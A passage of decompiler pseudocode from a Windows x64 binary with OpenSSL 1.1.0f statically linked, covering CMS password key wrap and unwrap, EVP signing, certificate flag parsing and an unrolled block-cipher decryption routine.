    v20 = v19 + v18 + 3 - (v19 + v18 + 3) % v19;
    if ( v20 >= 2i64 * v19 && v18 <= 0xFF )
    {
      v23 = v19 + v18 + 3 - (v19 + v18 + 3) % v19;
      v21 = (char *)sub_14001D8E0(v20);
      v5 = v21;
      if ( v21 )
      {
        if ( (unsigned int)sub_1400B3450(v21, &v23, *(_BYTE **)(v7 + 32), *(_QWORD *)(v7 + 40), v17) )
        {
          *(_QWORD *)(*(_QWORD *)(v3 + 24) + 8i64) = v5;
          **(_DWORD **)(v3 + 24) = v23;
          goto LABEL_29;
        }
      }
    }
  }
LABEL_30:
  sub_14001B4E0(v17);
  if ( !v4 )
    sub_14001D930(v5);
  sub_1400673C0((unsigned int *)v12);
  return v4;
}

//----- (00000001400B3290) ----------------------------------------------------
char *__fastcall sub_1400B3290(void *a1, _QWORD *a2, char *a3, unsigned __int64 a4, int *a5)
{
  int *v5; // rsi
  unsigned __int64 v9; // r14
  unsigned int v10; // ebp
  char *result; // rax
  char *v12; // rbx
  __int64 v13; // rcx
  size_t v14; // r8
  int v16; // [rsp+88h] [rbp+20h] BYREF

  v5 = a5;
  v9 = (int)sub_140024CD0((__int64)a5);
  v10 = 0;
  if ( a4 < 2 * v9 || a4 % v9 )
    return 0i64;
  result = (char *)sub_14001D8E0(a4);
  v12 = result;
  if ( result )
  {
    if ( (unsigned int)sub_14001BCD0(v5, &result[a4 + -2 * v9], &v16, &a3[a4 + -2 * v9], 2 * (int)v9)
      && (unsigned int)sub_14001BCD0(v5, v12, &v16, &v12[a4 - v9], v9)
      && (unsigned int)sub_14001BCD0(v5, v12, &v16, a3, (int)a4 - (int)v9)
      && (unsigned int)sub_14001BCA0(v5, 0i64, 0i64, 0i64, 0i64)
      && (unsigned int)sub_14001BCD0(v5, v12, &v16, v12, a4)
      && ((unsigned __int8)(v12[4] ^ v12[1]) & (unsigned __int8)((v12[2] ^ v12[5]) & (v12[3] ^ v12[6]))) == 0xFF )
    {
      v13 = (unsigned __int8)*v12;
      if ( a4 >= (int)v13 - 4 )
      {
        v14 = (unsigned __int8)*v12;
        *a2 = v13;
        memmove(a1, v12 + 4, v14);
        v10 = 1;
      }
    }
    sub_14001DA40(v12, a4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_pwri.c", 0xE1u);
    return (char *)v10;
  }
  return result;
}

//----- (00000001400B3450) ----------------------------------------------------
__int64 __fastcall sub_1400B3450(char *a1, unsigned __int64 *a2, _BYTE *a3, size_t a4, int *a5)
{
  int v9; // eax
  unsigned __int64 v10; // rdi
  int v12; // [rsp+68h] [rbp+20h] BYREF

  v9 = sub_140024CD0((__int64)a5);
  v10 = v9 + a4 + 3 - (v9 + a4 + 3) % v9;
  if ( v10 < 2i64 * v9 || a4 > 0xFF )
    return 0i64;
  if ( a1 )
  {
    *a1 = a4;
    a1[1] = ~*a3;
    a1[2] = ~a3[1];
    a1[3] = ~a3[2];
    memmove(a1 + 4, a3, a4);
    if ( v10 > a4 + 4 && (int)sub_140025460((__int64)&a1[a4 + 4], (int)v10 - (int)a4 - 4) <= 0 )
      return 0i64;
    if ( !(unsigned int)sub_14001C080(a5, a1, &v12, a1, v10) || !(unsigned int)sub_14001C080(a5, a1, &v12, a1, v10) )
      return 0i64;
  }
  *a2 = v10;
  return 1i64;
}

//----- (00000001400B3570) ----------------------------------------------------
void *sub_1400B3570()
{
  return &unk_14011F350;
}

//----- (00000001400B3580) ----------------------------------------------------
__int64 __fastcall sub_1400B3580(int a1, __int64 a2)
{
  if ( a1 == 3 )
    sub_14005EE60(*(unsigned int **)(*(_QWORD *)a2 + 32i64));
  return 1i64;
}

//----- (00000001400B35B0) ----------------------------------------------------
void *sub_1400B35B0()
{
  return &unk_14011F2E0;
}

//----- (00000001400B35C0) ----------------------------------------------------
void *sub_1400B35C0()
{
  return &unk_14011EBA0;
}

//----- (00000001400B35D0) ----------------------------------------------------
void *sub_1400B35D0()
{
  return &unk_14011F1A0;
}

//----- (00000001400B35E0) ----------------------------------------------------
void *sub_1400B35E0()
{
  return &unk_14011EC30;
}

//----- (00000001400B35F0) ----------------------------------------------------
void *sub_1400B35F0()
{
  return &unk_14011EAA0;
}

//----- (00000001400B3600) ----------------------------------------------------
void *sub_1400B3600()
{
  return &unk_14011ED40;
}

//----- (00000001400B3610) ----------------------------------------------------
void *sub_1400B3610()
{
  return &unk_14011EE60;
}

//----- (00000001400B3620) ----------------------------------------------------
void *sub_1400B3620()
{
  return &unk_14011EDB0;
}

//----- (00000001400B3630) ----------------------------------------------------
void *sub_1400B3630()
{
  return &unk_14011F0B0;
}

//----- (00000001400B3640) ----------------------------------------------------
void *sub_1400B3640()
{
  return &unk_14011F040;
}

//----- (00000001400B3650) ----------------------------------------------------
__int64 __fastcall sub_1400B3650(int a1, __int64 *a2, __int64 a3, __int64 *a4)
{
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  __int64 *v10; // rax

  v6 = a1 - 10;
  if ( !v6 )
  {
    if ( (int)sub_14007F490(a4 + 2, *a2) <= 0 )
      return 0i64;
    goto LABEL_8;
  }
  v7 = v6 - 1;
  if ( v7 )
  {
    v8 = v7 - 1;
    if ( v8 )
    {
      if ( v8 != 1 )
        return 1i64;
      return (int)sub_1400C00E0(*a2, a4[1]) > 0;
    }
LABEL_8:
    v10 = sub_1400C05D0(*a2, *a4);
    a4[1] = (__int64)v10;
    return v10 != 0;
  }
  return (int)sub_1400C00E0(*a2, a4[1]) > 0;
}

//----- (00000001400B36D0) ----------------------------------------------------
__int64 __fastcall sub_1400B36D0(int a1, __int64 a2)
{
  if ( a1 == 3 )
    sub_14001D3C0(*(_QWORD *)(*(_QWORD *)a2 + 56i64));
  return 1i64;
}

//----- (00000001400B3700) ----------------------------------------------------
void *sub_1400B3700()
{
  return &unk_14011EEB0;
}

//----- (00000001400B3710) ----------------------------------------------------
void *sub_1400B3710()
{
  return &unk_14011F610;
}

//----- (00000001400B3720) ----------------------------------------------------
void *sub_1400B3720()
{
  return &unk_14011F770;
}

//----- (00000001400B3730) ----------------------------------------------------
__int64 __fastcall sub_1400B3730(__int64 a1, __int64 a2)
{
  return sub_1400BDF30((__int64)&unk_14011F770, (__int64 *)(a1 + 80), (int *)(a1 + 96), (unsigned int *)a1, a2);
}

//----- (00000001400B3770) ----------------------------------------------------
__int64 __fastcall sub_1400B3770(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rcx
  __int64 v6; // xmm1_8
  int v10; // ebx
  __int64 v12; // rsi
  __int128 v13; // [rsp+20h] [rbp-58h] BYREF
  __int64 v14; // [rsp+30h] [rbp-48h]

  v5 = *(_QWORD *)(a1 + 48);
  v6 = *(_QWORD *)(a3 + 16);
  v13 = *(_OWORD *)a3;
  v14 = v6;
  if ( !(unsigned int)sub_140029620(v5) )
  {
    sub_140025D20(*(_DWORD **)(a1 + 216));
    sub_140029830(*(int **)(a1 + 48));
    sub_140025CE0(*(_DWORD **)(a1 + 216));
  }
  v10 = sub_140029490(*(int **)(a1 + 48), (__int64)&v13);
  if ( v10 < 0 )
    return 0i64;
  for ( ; v10 < (int)sub_1400296E0(*(unsigned int **)(a1 + 48)); ++v10 )
  {
    v12 = sub_140029880(*(_QWORD *)(a1 + 48), v10);
    if ( sub_14007D950(v12, a3) )
      break;
    if ( sub_1400B3B90(a1, a4, v12) )
    {
      if ( a2 )
        *a2 = v12;
      return (unsigned int)(*(_DWORD *)(v12 + 48) == 8) + 1;
    }
  }
  return 0i64;
}

//----- (00000001400B3890) ----------------------------------------------------
__int64 __fastcall sub_1400B3890(int a1, __int64 a2)
{
  __int64 v3; // rcx

  if ( *(_QWORD *)a2 )
  {
    v3 = *(_QWORD *)(*(_QWORD *)a2 + 48i64);
    if ( v3 )
    {
      if ( a1 == 5 )
        sub_140029810(v3, (__int64)sub_1400B3B70);
    }
  }
  return 1i64;
}

//----- (00000001400B38D0) ----------------------------------------------------
__int64 __fastcall sub_1400B38D0(int a1, __int64 *a2)
{
  __int64 v2; // rbx
  int v3; // ecx
  int v4; // ecx
  int *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  unsigned int *v8; // r14
  int v9; // edi
  __int64 v10; // rbp
  __int64 v11; // rax
  int v12; // esi
  int v13; // eax
  unsigned int (__fastcall *v15)(__int64); // rdx
  unsigned int (__fastcall *v16)(__int64); // rdx
  void *v17; // rax

  v2 = *a2;
  v3 = a1 - 1;
  if ( !v3 )
  {
    v17 = off_14013D178;
    *(_QWORD *)(v2 + 136) = 0i64;
    *(_QWORD *)(v2 + 128) = 0i64;
    *(_DWORD *)(v2 + 124) = 0;
    *(_DWORD *)(v2 + 144) = 0;
    *(_QWORD *)(v2 + 200) = v17;
    *(_QWORD *)(v2 + 208) = 0i64;
    *(_QWORD *)(v2 + 168) = 0i64;
    *(_QWORD *)(v2 + 152) = 0i64;
    *(_QWORD *)(v2 + 160) = 0i64;
    *(_DWORD *)(v2 + 148) = 32895;
    return 1i64;
  }
  v4 = v3 - 2;
  if ( v4 )
  {
    if ( v4 == 2 )
    {
      v5 = (int *)sub_14005BAC0();
      sub_1400AC7C0(v2, v5, v2 + 176, 0i64);
      v6 = sub_1400AC900(v2, 770, 0i64, 0i64);
      *(_QWORD *)(v2 + 136) = v6;
      if ( v6 )
        sub_1400B3E00(v2, v6);
      *(_QWORD *)(v2 + 128) = sub_1400AC900(v2, 90, 0i64, 0i64);
      *(_QWORD *)(v2 + 152) = sub_1400AC900(v2, 88, 0i64, 0i64);
      v7 = sub_1400AC900(v2, 140, 0i64, 0i64);
      *(_QWORD *)(v2 + 160) = v7;
      if ( v7 && !*(_QWORD *)(v2 + 152) )
        *(_DWORD *)(v2 + 124) |= 0x80u;
      v8 = *(unsigned int **)(v2 + 56);
      v9 = 0;
      if ( (int)sub_1400296E0(v8) > 0 )
      {
        while ( 1 )
        {
          v10 = sub_140029880((__int64)v8, v9);
          v11 = sub_1400252A0(v10);
          v12 = sub_14002C260(v11);
          if ( v12 == 857 )
            *(_DWORD *)(v2 + 124) |= 0x1000u;
          LOBYTE(v13) = sub_1400AC9C0(v10);
          if ( v13 )
          {
            if ( v12 != 770 && v12 != 90 && v12 != 140 )
              break;
          }
          if ( ++v9 >= (int)sub_1400296E0(v8) )
            goto LABEL_19;
        }
        *(_DWORD *)(v2 + 124) |= 0x200u;
      }
LABEL_19:
      if ( (unsigned int)sub_1400B3C60(v2) )
      {
        v15 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)(v2 + 200) + 8i64);
        if ( !v15 || v15(v2) )
        {
          *(_DWORD *)(v2 + 124) |= 0x100u;
          return 1i64;
        }
      }
      return 0i64;
    }
    return 1i64;
  }
  v16 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)(v2 + 200) + 16i64);
  if ( v16 && !v16(v2) )
    return 0i64;
  sub_1400A5500(*(unsigned int **)(v2 + 128));
  sub_1400A5E00(*(unsigned int **)(v2 + 136));
  sub_14004FD70(*(_QWORD *)(v2 + 152));
  sub_14004FD70(*(_QWORD *)(v2 + 160));
  sub_140029720(*(void **)(v2 + 168), (void (*)(void))sub_1400A5580);
  return 1i64;
}
// 1400B3A07: variable 'v13' is possibly undefined
// 14013D178: using guessed type void *off_14013D178;

//----- (00000001400B3B60) ----------------------------------------------------
void *sub_1400B3B60()
{
  return &unk_14011F800;
}

//----- (00000001400B3B70) ----------------------------------------------------
int __fastcall sub_1400B3B70(const void ***a1, __int64 *a2)
{
  return sub_140047390(*a1, *a2);
}

//----- (00000001400B3B90) ----------------------------------------------------
_BOOL8 __fastcall sub_1400B3B90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rsi
  __int64 v6; // rax
  int v7; // ebx
  __int64 v8; // rax

  v4 = a2;
  if ( *(_QWORD *)(a3 + 40) )
  {
    if ( !a2 )
      v4 = sub_14001C740(a1);
    v7 = 0;
    if ( (int)sub_1400296E0(*(unsigned int **)(a3 + 40)) > 0 )
    {
      while ( 1 )
      {
        v8 = sub_140029880(*(_QWORD *)(a3 + 40), v7);
        if ( *(_DWORD *)v8 == 4 && !sub_14005EF30(v4, *(_QWORD *)(v8 + 8)) )
          break;
        if ( ++v7 >= (int)sub_1400296E0(*(unsigned int **)(a3 + 40)) )
          return 0i64;
      }
      return 1i64;
    }
    return 0i64;
  }
  else
  {
    if ( !a2 )
      return 1i64;
    v6 = sub_14001C740(a1);
    return sub_14005EF30(v4, v6) == 0;
  }
}

//----- (00000001400B3C60) ----------------------------------------------------
__int64 __fastcall sub_1400B3C60(__int64 a1)
{
  __int64 v2; // r15
  int v3; // ebp
  unsigned int *v4; // r14
  __int64 v5; // rdi
  __int64 v6; // rax
  __int64 v7; // rbx
  _QWORD *v9; // rax
  int *v10; // rax
  __int64 v11; // rbx
  unsigned int *v12; // rdi
  int v13; // eax
  int v14; // ecx
  __int64 v15; // rbx
  int v16; // eax
  __int64 v17; // rax
  int v18; // eax
  int v19; // [rsp+58h] [rbp+10h] BYREF

  v2 = 0i64;
  v3 = 0;
  v4 = (unsigned int *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  if ( (int)sub_1400296E0(v4) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v5 = sub_140029880((__int64)v4, v3);
    v6 = sub_1400AC920(v5, 771, &v19, 0i64);
    v7 = v6;
    if ( v6 )
      break;
    if ( v19 != -1 )
      goto LABEL_4;
LABEL_9:
    *(_QWORD *)(v5 + 40) = v2;
    v10 = (int *)sub_1400AC920(v5, 141, &v19, 0i64);
    v11 = (__int64)v10;
    if ( v10 )
    {
      *(_DWORD *)(v5 + 48) = sub_14007D8B0(v10);
      sub_14004FD70(v11);
    }
    else
    {
      if ( v19 != -1 )
      {
LABEL_4:
        *(_DWORD *)(a1 + 124) |= 0x80u;
        return 1i64;
      }
      *(_DWORD *)(v5 + 48) = -1;
    }
    v12 = *(unsigned int **)(v5 + 32);
    v19 = 0;
    v13 = sub_1400296E0(v12);
    v14 = v19;
    if ( v19 < v13 )
    {
      while ( 1 )
      {
        v15 = sub_140029880((__int64)v12, v14);
        LOBYTE(v16) = sub_1400AC9C0(v15);
        if ( v16 )
        {
          v17 = sub_1400252A0(v15);
          if ( (unsigned int)sub_14002C260(v17) != 771 )
            break;
        }
        ++v19;
        v18 = sub_1400296E0(v12);
        v14 = v19;
        if ( v19 >= v18 )
          goto LABEL_19;
      }
      *(_DWORD *)(a1 + 124) |= 0x200u;
    }
LABEL_19:
    if ( ++v3 >= (int)sub_1400296E0(v4) )
      return 1i64;
  }
  v2 = v6;
  if ( *(_QWORD *)(a1 + 168) || (v9 = sub_1400296C0(), (*(_QWORD *)(a1 + 168) = v9) != 0i64) )
  {
    if ( (unsigned int)sub_1400297C0(*(int **)(a1 + 168), v7) )
      goto LABEL_9;
  }
  return 0i64;
}
// 1400B3DA7: variable 'v16' is possibly undefined
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400B3E00) ----------------------------------------------------
__int64 __fastcall sub_1400B3E00(__int64 a1, __int64 a2)
{
  unsigned int v2; // eax
  __int64 v4; // rax
  __int64 v5; // rax
  unsigned int *v6; // rax

  *(_DWORD *)(a1 + 144) |= 1u;
  v2 = 0;
  if ( *(int *)(a2 + 8) > 0 )
  {
    *(_DWORD *)(a1 + 144) |= 4u;
    v2 = 1;
  }
  if ( *(int *)(a2 + 12) > 0 )
  {
    ++v2;
    *(_DWORD *)(a1 + 144) |= 8u;
  }
  if ( *(int *)(a2 + 28) > 0 )
  {
    ++v2;
    *(_DWORD *)(a1 + 144) |= 0x10u;
  }
  if ( v2 > 1 )
    *(_DWORD *)(a1 + 144) |= 2u;
  if ( *(int *)(a2 + 24) > 0 )
    *(_DWORD *)(a1 + 144) |= 0x20u;
  if ( *(_QWORD *)(a2 + 16) )
  {
    *(_DWORD *)(a1 + 144) |= 0x40u;
    v4 = *(_QWORD *)(a2 + 16);
    if ( *(int *)v4 > 0 )
      *(_DWORD *)(a1 + 148) = **(unsigned __int8 **)(v4 + 8);
    v5 = *(_QWORD *)(a2 + 16);
    if ( *(int *)v5 > 1 )
      *(_DWORD *)(a1 + 148) |= *(unsigned __int8 *)(*(_QWORD *)(v5 + 8) + 1i64) << 8;
    *(_DWORD *)(a1 + 148) &= 0x807Fu;
  }
  v6 = (unsigned int *)sub_14001C740(a1);
  return sub_1400A5D10(*(_QWORD *)a2, v6);
}

//----- (00000001400B3ED0) ----------------------------------------------------
__int64 __fastcall sub_1400B3ED0(__int64 *a1, __int64 a2, _DWORD *a3, __int64 a4)
{
  __int64 *v5; // rbx
  unsigned int v9; // edi
  __int64 *v10; // rax
  __int64 *v11; // rbx
  int v13; // edi
  __int64 *v14; // rax
  __int64 v15; // rax
  unsigned int v16; // [rsp+30h] [rbp-98h] BYREF
  __int64 v17; // [rsp+38h] [rbp-90h] BYREF
  char v18[64]; // [rsp+40h] [rbp-88h] BYREF

  v16 = 0;
  v5 = 0i64;
  *a3 = 0;
  v9 = 0;
  if ( !(unsigned int)sub_1400252C0((__int64)a1, 0x200u) )
  {
    v10 = (__int64 *)sub_14006DFD0();
    v11 = v10;
    if ( v10 )
    {
      v13 = sub_14006DDB0(v10, (__int64)a1);
      if ( v13 )
        v13 = sub_14006DA80(v11, (__int64)v18, &v16);
      sub_14006DF90(v11);
      if ( v13 )
        goto LABEL_10;
    }
    else
    {
      sub_140024610(6, 107, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\p_sign.c", 34);
    }
    return 0i64;
  }
  if ( (unsigned int)sub_14006DA80(a1, (__int64)v18, &v16) )
  {
LABEL_10:
    v17 = (int)sub_14001D700(a4);
    v9 = 0;
    v14 = sub_140020770(a4, 0i64);
    v5 = v14;
    if ( v14 )
    {
      if ( (int)sub_1400211C0(v14) > 0 )
      {
        v15 = sub_1400252A0((__int64)a1);
        if ( (int)sub_140020440(v5, -1, 248, 1u, 0, v15) > 0 && (int)sub_140021070(v5, a2, &v17, (__int64)v18, v16) > 0 )
        {
          v9 = 1;
          *a3 = v17;
        }
      }
    }
  }
  sub_140020670(v5);
  return v9;
}

//----- (00000001400B4060) ----------------------------------------------------
_DWORD *__fastcall sub_1400B4060(__int64 a1, int a2)
{
  int v4; // eax
  __time64_t Time; // [rsp+30h] [rbp+8h] BYREF

  time64(&Time);
  if ( !a1 || (*(_BYTE *)(a1 + 16) & 0x40) != 0 )
    return sub_1400AC100((_DWORD *)a1, Time, 0, a2);
  v4 = *(_DWORD *)(a1 + 4);
  if ( v4 == 23 )
    return sub_1400BCDA0((_DWORD *)a1, Time, 0, a2);
  if ( v4 == 24 )
    return sub_1400BD3F0((_DWORD *)a1, Time, 0, a2);
  else
    return sub_1400AC100((_DWORD *)a1, Time, 0, a2);
}

//----- (00000001400B4100) ----------------------------------------------------
_BOOL8 __fastcall sub_1400B4100(__int64 a1, unsigned int a2, int a3, char *a4, int a5)
{
  return sub_1400AEF30((void ***)(a1 + 24), a2, a3, a4, a5) != 0i64;
}

//----- (00000001400B4130) ----------------------------------------------------
__int64 __fastcall sub_1400B4130(__int64 a1, unsigned int a2, int a3)
{
  return sub_1400ACA30(*(unsigned int **)(a1 + 24), a2, a3);
}

//----- (00000001400B4150) ----------------------------------------------------
__int64 __fastcall sub_1400B4150(__int64 a1)
{
  return sub_1400AEF90(*(unsigned int **)(a1 + 24));
}

//----- (00000001400B4170) ----------------------------------------------------
__int64 __fastcall sub_1400B4170(_QWORD *a1, __int64 *a2)
{
  _QWORD *v3; // rax
  _QWORD *v4; // rbx
  _DWORD *v5; // rax

  v3 = (_QWORD *)sub_1400B27C0(a2);
  v4 = v3;
  if ( !v3 )
    return 0i64;
  if ( !*v3 )
  {
    v5 = sub_14004FEE0();
    *v4 = v5;
    if ( !v5 )
    {
      sub_140024610(46, 155, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_io.c", 31);
      return 0i64;
    }
  }
  *(_DWORD *)(*v4 + 16i64) |= 0x10u;
  *(_DWORD *)(*v4 + 16i64) &= ~0x20u;
  *a1 = *v4 + 8i64;
  return 1i64;
}

//----- (00000001400B4200) ----------------------------------------------------
__int64 __fastcall sub_1400B4200(int a1, unsigned __int8 *a2, __int64 a3, _BYTE *a4)
{
  unsigned int *v4; // r15
  _DWORD *v6; // rax
  unsigned __int64 v7; // r10
  unsigned int v8; // edi
  unsigned int v9; // ebp
  int v10; // esi
  int v11; // r14d
  unsigned __int64 v12; // r9
  int v13; // ecx
  unsigned int *v14; // rax
  unsigned int v15; // r11d
  unsigned int v16; // esi
  unsigned int v17; // r14d
  unsigned int v18; // r11d
  unsigned int v19; // edi
  unsigned int v20; // ebp
  unsigned int v21; // r11d
  unsigned int v22; // esi
  unsigned int v23; // r14d
  unsigned int v24; // r11d
  unsigned int v25; // edi
  unsigned int v26; // ebp
  unsigned int v27; // r11d
  unsigned int v28; // esi
  unsigned int v29; // r14d
  unsigned int v30; // r11d
  unsigned int v31; // edi
  int v32; // ebp
  unsigned __int64 v33; // r9
  unsigned __int64 v34; // r10
  unsigned int v35; // ebp
  unsigned int v36; // edx
  unsigned int v37; // esi
  int v38; // r8d
  unsigned int v39; // edi
  int v40; // r14d
  unsigned int v41; // r11d
  unsigned int v42; // esi
  unsigned int v43; // r14d
  unsigned int v44; // r11d
  unsigned int v45; // edi
  unsigned int v46; // ebp
  unsigned int v47; // r11d
  unsigned int v48; // esi
  unsigned int v49; // r14d
  unsigned int v50; // r11d
  unsigned int v51; // edi
  unsigned int v52; // ebp
  unsigned int v53; // r11d
  unsigned int v54; // r11d
  int v55; // esi
  int v56; // edi
  unsigned int v57; // ebp
  int v58; // r14d
  __int64 result; // rax

  v4 = (unsigned int *)(a3 + 16);
  v6 = (_DWORD *)(a3 + 64i64 * a1);
  v7 = (unsigned int)*(v6 - 1);
  v8 = *v6 ^ a2[3] ^ ((a2[2] ^ ((a2[1] ^ (*a2 << 8)) << 8)) << 8);
  v9 = v6[1] ^ a2[7] ^ ((a2[6] ^ ((a2[5] ^ (a2[4] << 8)) << 8)) << 8);
  v10 = v6[2] ^ a2[11] ^ ((a2[10] ^ ((a2[9] ^ (a2[8] << 8)) << 8)) << 8);
  v11 = v6[3] ^ a2[15] ^ ((a2[14] ^ ((a2[13] ^ (a2[12] << 8)) << 8)) << 8);
  v12 = v8 ^ (unsigned __int64)(unsigned int)*(v6 - 2);
  v13 = v8 ^ *(v6 - 2);
  v14 = v6 - 12;
  v15 = dword_14011F910[(unsigned __int8)v12 + 256] ^ dword_14011F910[v12 >> 24] ^ dword_14011F910[BYTE1(v12) + 768] ^ dword_14011F910[BYTE2(v13) + 512];
  LODWORD(v12) = v15 ^ dword_14011F910[(unsigned __int8)(v9 ^ v7)] ^ dword_14011F910[((v9 ^ v7) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v9 ^ v7) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v9 ^ (unsigned int)v7) >> 16) + 768];
  v16 = v12 ^ v10;
  v17 = v12 ^ ((v15 >> 8) + (v15 << 24)) ^ v11;
  v18 = dword_14011F910[(unsigned __int8)(v16 ^ v14[8]) + 256] ^ dword_14011F910[(v16 ^ (unsigned __int64)v14[8]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v16 ^ v14[8]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v16 ^ v14[8]) >> 16) + 512];
  LODWORD(v12) = v18 ^ dword_14011F910[(unsigned __int8)(v17 ^ v14[9])] ^ dword_14011F910[((v17 ^ (unsigned __int64)v14[9]) >> 24)
                                                                                        + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v17 ^ v14[9]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v17 ^ v14[9]) >> 16) + 768];
  v19 = v12 ^ v8;
  v20 = v12 ^ ((v18 >> 8) + (v18 << 24)) ^ v9;
  v21 = dword_14011F910[(unsigned __int8)(v19 ^ v14[6]) + 256] ^ dword_14011F910[(v19 ^ (unsigned __int64)v14[6]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v19 ^ v14[6]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v19 ^ v14[6]) >> 16) + 512];
  LODWORD(v12) = v21 ^ dword_14011F910[(unsigned __int8)(v20 ^ v14[7])] ^ dword_14011F910[((v20 ^ (unsigned __int64)v14[7]) >> 24)
                                                                                        + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v20 ^ v14[7]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v20 ^ v14[7]) >> 16) + 768];
  v22 = v12 ^ v16;
  v23 = v12 ^ ((v21 >> 8) + (v21 << 24)) ^ v17;
  v24 = dword_14011F910[(unsigned __int8)(v22 ^ v14[4]) + 256] ^ dword_14011F910[(v22 ^ (unsigned __int64)v14[4]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v22 ^ v14[4]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v22 ^ v14[4]) >> 16) + 512];
  LODWORD(v12) = v24 ^ dword_14011F910[(unsigned __int8)(v23 ^ v14[5])] ^ dword_14011F910[((v23 ^ (unsigned __int64)v14[5]) >> 24)
                                                                                        + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v23 ^ v14[5]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v23 ^ v14[5]) >> 16) + 768];
  v25 = v12 ^ v19;
  v26 = v12 ^ ((v24 >> 8) + (v24 << 24)) ^ v20;
  v27 = dword_14011F910[(unsigned __int8)(v25 ^ v14[2]) + 256] ^ dword_14011F910[(v25 ^ (unsigned __int64)v14[2]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v25 ^ v14[2]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v25 ^ v14[2]) >> 16) + 512];
  LODWORD(v12) = v27 ^ dword_14011F910[(unsigned __int8)(v26 ^ v14[3])] ^ dword_14011F910[((v26 ^ (unsigned __int64)v14[3]) >> 24)
                                                                                        + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v26 ^ v14[3]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v26 ^ v14[3]) >> 16) + 768];
  v28 = v12 ^ v22;
  v29 = v12 ^ ((v27 >> 8) + (v27 << 24)) ^ v23;
  v30 = dword_14011F910[(unsigned __int8)(v28 ^ *v14) + 256] ^ dword_14011F910[(v28 ^ (unsigned __int64)*v14) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v28 ^ *v14) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v28 ^ *v14) >> 16) + 512];
  LODWORD(v12) = v30 ^ dword_14011F910[(unsigned __int8)(v29 ^ v14[1])] ^ dword_14011F910[((v29 ^ (unsigned __int64)v14[1]) >> 24)
                                                                                        + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v29 ^ v14[1]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v29 ^ v14[1]) >> 16) + 768];
  v31 = v12 ^ v25;
  v32 = v12 ^ ((v30 >> 8) + (v30 << 24)) ^ v26;
  if ( v14 != (unsigned int *)(a3 + 16) )
  {
    do
    {
      v33 = *(v14 - 6);
      v34 = *(v14 - 5);
      v35 = (((v31 >> 31) & (*(v14 - 2) >> 31)) + 2 * (v31 & *(v14 - 2))) ^ v32;
      v36 = *(v14 - 4) >> 31;
      v37 = (v29 | *(v14 - 3)) ^ v28;
      v38 = v37 & *(v14 - 4);
      v39 = (v35 | *(v14 - 1)) ^ v31;
      v14 -= 16;
      v40 = (((v37 >> 31) & v36) + 2 * v38) ^ v29;
      v41 = dword_14011F910[(unsigned __int8)(v39 ^ v33) + 256] ^ dword_14011F910[(v39 ^ v33) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v39 ^ v33) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v39 ^ (unsigned int)v33) >> 16) + 512];
      LODWORD(v33) = v41 ^ dword_14011F910[(unsigned __int8)(v35 ^ v34)] ^ dword_14011F910[((v35 ^ v34) >> 24) + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v35 ^ v34) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v35 ^ (unsigned int)v34) >> 16) + 768];
      v42 = v33 ^ v37;
      v43 = v33 ^ ((v41 >> 8) + (v41 << 24)) ^ v40;
      v44 = dword_14011F910[(unsigned __int8)(v42 ^ v14[8]) + 256] ^ dword_14011F910[(v42 ^ (unsigned __int64)v14[8]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v42 ^ v14[8]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v42 ^ v14[8]) >> 16) + 512];
      LODWORD(v33) = v44 ^ dword_14011F910[(unsigned __int8)(v43 ^ v14[9])] ^ dword_14011F910[((v43 ^ (unsigned __int64)v14[9]) >> 24)
                                                                                            + 512] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v43 ^ v14[9]) >> 8) + 256] ^ dword_14011F910[(unsigned __int8)((v43 ^ v14[9]) >> 16) + 768];
      v45 = v33 ^ v39;
      v46 = v33 ^ ((v44 >> 8) + (v44 << 24)) ^ v35;
      v47 = dword_14011F910[(unsigned __int8)(v45 ^ v14[6]) + 256] ^ dword_14011F910[(v45 ^ (unsigned __int64)v14[6]) >> 24] ^ dword_14011F910[(unsigned __int8)((unsigned __int16)(v45 ^ v14[6]) >> 8) + 768] ^ dword_14011F910[(unsigned __int8)((v45 ^ v14[6]) >> 16) + 512];
